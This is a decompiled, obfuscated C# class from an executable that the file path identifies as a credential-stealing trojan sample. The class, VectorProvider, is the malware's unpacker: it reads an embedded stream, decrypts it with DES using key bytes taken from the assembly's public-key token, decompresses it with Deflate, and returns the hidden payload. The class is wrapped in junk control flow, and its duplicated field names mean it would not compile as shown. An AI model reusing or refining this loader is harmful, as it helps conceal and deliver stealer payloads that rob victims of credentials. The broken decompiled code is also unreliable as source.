// Decompiled with JetBrains decompiler
// Type: Ajowans.VectorProvider
// Assembly: Ajowans, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B9451E92-9872-44E9-A53B-32BF899B0E6F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-PSW.Win32.Stealer.gen-ca27c07cc9fddcd8bc07b2b9aa3406ab019fb54797bf2163b190217e9c17ce6a.exe

using System;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Security.Cryptography;

namespace Ajowans
{
  internal class VectorProvider
  {
    private static readonly object pathList;
    private static readonly int pathList;
    private static readonly int generatorCache;
    private static readonly MemoryStream pathList = (MemoryStream) null;
    private static readonly MemoryStream generatorCache = (MemoryStream) null;
    private static readonly byte pathList;

    static VectorProvider()
    {
      VectorProvider.pathList = int.MaxValue;
      VectorProvider.generatorCache = int.MinValue;
      VectorProvider.pathList = Partition.RegisterFile(0);
      VectorProvider.generatorCache = Partition.RegisterFile(0);
      VectorProvider.pathList = ReferenceDictionary.RegisterFile();
    }

    private static string RegisterFile(Assembly pathList)
    {
      string pathList1 = PaneOptions.RegisterFile((object) pathList);
      int previousHandler = QueueSet.RegisterFile((object) pathList1, ',');
      if (previousHandler >= 0)
      {
label_1:
        switch (6)
        {
          case 0:
            goto label_1;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (VectorProvider.RegisterFile);
            }
            pathList1 = MenuItemInfo.RegisterFile((object) pathList1, 0, previousHandler);
            break;
        }
      }
      return pathList1;
    }

    private static byte[] RegisterFile(Assembly pathList)
    {
      try
      {
        string pathList1 = PaneOptions.RegisterFile((object) pathList);
        int num = StoreTree.RegisterFile((object) pathList1, "PublicKeyToken=");
        if (num < 0)
        {
label_1:
          switch (7)
          {
            case 0:
              goto label_1;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (VectorProvider.RegisterFile);
              }
              num = StoreTree.RegisterFile((object) pathList1, "publickeytoken=");
              break;
          }
        }
        if (num < 0)
        {
label_6:
          switch (6)
          {
            case 0:
              goto label_6;
            default:
              return (byte[]) null;
          }
        }
        else
        {
          int generatorCache = num + 15;
          if (FormFactory.RegisterFile((object) pathList1, generatorCache) != 'n')
          {
label_9:
            switch (1)
            {
              case 0:
                goto label_9;
              default:
                if (FormFactory.RegisterFile((object) pathList1, generatorCache) == 'N')
                {
label_11:
                  switch (4)
                  {
                    case 0:
                      goto label_11;
                  }
                }
                else
                {
                  byte[] pathList2 = TextFileFactory.RegisterFile(SelectionInfo.RegisterFile(MenuItemInfo.RegisterFile((object) pathList1, generatorCache, 16), NumberStyles.HexNumber));
                  DialogFactory.RegisterFile((Array) pathList2);
                  return pathList2;
                }
                break;
            }
          }
          return (byte[]) null;
        }
      }
      catch
      {
      }
      return (byte[]) null;
    }

    internal static byte[] RegisterFile(Stream pathList)
    {
      object pathList1;
      MethodConverter.RegisterFile(pathList1 = VectorProvider.pathList);
      try
      {
        return VectorProvider.RegisterFile(97L, (object) pathList);
      }
      finally
      {
        FunctionLoader.RegisterFile(pathList1);
      }
    }

    internal static byte[] RegisterFile(long pathList, Stream generatorCache)
    {
      try
      {
        return VectorProvider.RegisterFile(generatorCache);
      }
      catch
      {
        return VectorProvider.RegisterFile(97L, (object) generatorCache);
      }
    }

    internal static byte[] RegisterFile(long pathList, object generatorCache)
    {
      Stream pathList1 = generatorCache as Stream;
      Stream pathList2 = pathList1;
      MemoryStream pathList3 = (MemoryStream) null;
      for (int index = 1; index < 4; ++index)
        ClientHelper.RegisterFile((object) pathList1);
label_3:
      switch (3)
      {
        case 0:
          goto label_3;
        default:
          if (false)
          {
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (VectorProvider.RegisterFile);
          }
          ushort num1 = ~(ushort) ClientHelper.RegisterFile((object) pathList1);
          if (((int) num1 & 2) != 0)
          {
label_7:
            switch (4)
            {
              case 0:
                goto label_7;
              default:
                DESCryptoServiceProvider pathList4 = DiskLoader.RegisterFile();
                byte[] generatorCache1 = new byte[8];
                EditorList.RegisterFile((object) pathList1, generatorCache1, 0, 8);
                LineOptions.RegisterFile((object) pathList4, generatorCache1);
                byte[] generatorCache2 = new byte[8];
                EditorList.RegisterFile((object) pathList1, generatorCache2, 0, 8);
                bool flag = true;
                foreach (byte num2 in generatorCache2)
                {
                  if (num2 != (byte) 0)
                  {
label_10:
                    switch (7)
                    {
                      case 0:
                        goto label_10;
                      default:
                        flag = false;
                        goto label_15;
                    }
                  }
                }
label_14:
                switch (4)
                {
                  case 0:
                    goto label_14;
                }
label_15:
                if (flag)
                {
label_16:
                  switch (3)
                  {
                    case 0:
                      goto label_16;
                    default:
                      generatorCache2 = VectorProvider.RegisterFile(FunctionCollection.RegisterFile());
                      break;
                  }
                }
                MethodTree.RegisterFile((object) pathList4, generatorCache2);
                if (VectorProvider.pathList == null)
                {
label_19:
                  switch (6)
                  {
                    case 0:
                      goto label_19;
                    default:
                      if (VectorProvider.pathList == int.MaxValue)
                      {
label_21:
                        switch (7)
                        {
                          case 0:
                            goto label_21;
                          default:
                            ToolboxSettings.RegisterFile((object) VectorProvider.pathList, (int) NetworkSet.RegisterFile((object) pathList1));
                            break;
                        }
                      }
                      else
                      {
                        ToolboxSettings.RegisterFile((object) VectorProvider.pathList, VectorProvider.pathList);
                        break;
                      }
                      break;
                  }
                }
                AssistantResolver.RegisterFile((object) VectorProvider.pathList, 0L);
                ICryptoTransform pathList5 = TreeNodeQueue.RegisterFile((object) pathList4);
                int namesEnabled1 = DockingPaneDictionary.RegisterFile((object) pathList5);
                DialogScope.RegisterFile((object) pathList5);
                byte[] numArray = new byte[DialogScope.RegisterFile((object) pathList5)];
                byte[] generatorCache3 = new byte[DockingPaneDictionary.RegisterFile((object) pathList5)];
                int num3;
                for (num3 = (int) PaneQueue.RegisterFile((object) pathList1); (long) (num3 + namesEnabled1) < NetworkSet.RegisterFile((object) pathList1); num3 += namesEnabled1)
                {
                  EditorList.RegisterFile((object) pathList1, generatorCache3, 0, namesEnabled1);
                  int namesEnabled2 = ImageDesigner.RegisterFile((object) pathList5, generatorCache3, 0, namesEnabled1, numArray, 0);
                  PluginTree.RegisterFile((object) VectorProvider.pathList, numArray, 0, namesEnabled2);
                }
label_27:
                switch (1)
                {
                  case 0:
                    goto label_27;
                  default:
                    EditorList.RegisterFile((object) pathList1, generatorCache3, 0, (int) (NetworkSet.RegisterFile((object) pathList1) - (long) num3));
                    byte[] generatorCache4 = ToolbarAttribute.RegisterFile((object) pathList5, generatorCache3, 0, (int) (NetworkSet.RegisterFile((object) pathList1) - (long) num3));
                    PluginTree.RegisterFile((object) VectorProvider.pathList, generatorCache4, 0, generatorCache4.Length);
                    pathList2 = (Stream) VectorProvider.pathList;
                    AssistantResolver.RegisterFile((object) pathList2, 0L);
                    pathList3 = VectorProvider.pathList;
                    break;
                }
                break;
            }
          }
          if (((int) num1 & 8) != 0)
          {
label_30:
            switch (7)
            {
              case 0:
                goto label_30;
              default:
                if (VectorProvider.generatorCache == null)
                {
label_32:
                  switch (1)
                  {
                    case 0:
                      goto label_32;
                    default:
                      if (VectorProvider.generatorCache == int.MinValue)
                      {
label_34:
                        switch (5)
                        {
                          case 0:
                            goto label_34;
                          default:
                            ToolboxSettings.RegisterFile((object) VectorProvider.generatorCache, (int) NetworkSet.RegisterFile((object) pathList2) * 2);
                            break;
                        }
                      }
                      else
                      {
                        ToolboxSettings.RegisterFile((object) VectorProvider.generatorCache, VectorProvider.generatorCache);
                        break;
                      }
                      break;
                  }
                }
                AssistantResolver.RegisterFile((object) VectorProvider.generatorCache, 0L);
                DeflateStream pathList6 = MethodType.RegisterFile(pathList2, CompressionMode.Decompress);
                int namesEnabled3 = 1000;
                byte[] generatorCache5 = new byte[namesEnabled3];
                int namesEnabled4;
                do
                {
                  namesEnabled4 = EditorList.RegisterFile((object) pathList6, generatorCache5, 0, namesEnabled3);
                  if (namesEnabled4 > 0)
                  {
label_39:
                    switch (6)
                    {
                      case 0:
                        goto label_39;
                      default:
                        PluginTree.RegisterFile((object) VectorProvider.generatorCache, generatorCache5, 0, namesEnabled4);
                        break;
                    }
                  }
                }
                while (namesEnabled4 >= namesEnabled3);
label_42:
                switch (2)
                {
                  case 0:
                    goto label_42;
                  default:
                    pathList3 = VectorProvider.generatorCache;
                    break;
                }
                break;
            }
          }
          if (pathList3 != null)
          {
label_45:
            switch (6)
            {
              case 0:
                goto label_45;
              default:
                return StoreScope.RegisterFile((object) pathList3);
            }
          }
          else
          {
            byte[] generatorCache6 = new byte[NetworkSet.RegisterFile((object) pathList1) - PaneQueue.RegisterFile((object) pathList1)];
            EditorList.RegisterFile((object) pathList1, generatorCache6, 0, generatorCache6.Length);
            return generatorCache6;
          }
      }
    }
  }
}
